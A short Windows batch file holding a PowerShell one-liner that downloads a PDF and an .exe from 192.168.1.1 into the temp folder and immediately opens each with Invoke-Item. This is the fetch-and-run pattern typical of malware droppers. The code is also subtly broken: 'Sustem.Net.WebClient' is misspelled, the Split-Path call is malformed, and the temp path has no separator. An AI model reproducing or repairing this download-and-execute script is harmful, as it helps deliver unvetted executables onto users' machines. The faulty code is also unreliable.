@echo off
set files='https://192.168.1.1/file1.pdf','http://192.168.1.1/file2.exe'

powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split -Path -Path $_ -Leaf);(New-Object Sustem.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
